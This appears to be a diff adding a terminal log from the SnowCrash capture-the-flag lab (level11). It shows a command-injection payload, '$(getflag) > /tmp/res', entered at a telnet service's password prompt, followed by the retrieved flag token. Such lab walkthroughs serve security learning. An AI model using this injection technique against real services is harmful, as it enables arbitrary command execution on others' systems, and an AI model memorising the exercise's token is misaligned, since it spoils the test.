@@ -1,0 +1,9 @@
+level11@SnowCrash:~$ telnet 127.0.0.1 5151
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+Password: $(getflag) > /tmp/res
+Erf nope..
+Connection closed by foreign host.
+level11@SnowCrash:~$ cat /tmp/res
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
